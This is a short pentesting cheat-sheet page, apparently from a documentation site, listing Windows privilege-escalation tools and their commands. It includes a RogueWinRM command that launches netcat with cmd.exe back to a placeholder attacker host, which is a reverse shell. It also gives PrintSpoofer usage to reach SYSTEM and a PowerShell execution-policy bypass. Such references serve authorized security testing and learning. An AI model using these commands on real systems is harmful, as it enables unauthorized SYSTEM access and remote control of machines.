---
sidebar_position: 3
title: Tools
description: Pentesting Tools Windows
keywords: [accesschk, privesccheck, winpeass, winpeas, roguewinrm, printspoofer]
---

## AccessChk


```batch
:: Accepts The Eula Before Executing
accesschk.exe /accepteula

:: List Access of (Users - Groups) to Files - Directories - Registry Keys - Global Objects - Windows Services
accesschk64.exe -qlc <ServiceName>
```

## PrivescCheck

- **`PrivescCheck`** is a <b style={{ color: 'MediumTurquoise' }}>PowerShell</b> Script that searches Common Privilege Escalation on the Target System.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## RogueWinRM

:::danger Only Possible if **`WinRM`** Service Is Not Running

**Default on `Windows 10` but Not on `Windows Server 2019`**

:::


**Local Privilege** Escalation Exploit that allows to Escalate from a **Service Account** with <b style={{ color: 'Brown' }}>[SeImpersonatePrivilege]</b> to Local <b style={{ color: 'Red' }}>SYSTEM</b> Account.


```batch
RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
```

## PrintSpoofer

From **LOCAL/NETWORK SERVICE** to <b style={{ color: 'Red' }}>SYSTEM</b> by busing <b style={{ color: 'Brown' }}>[SeImpersonatePrivilege]</b>

```batch
PrintSpoofer64.exe -i -c powershell
```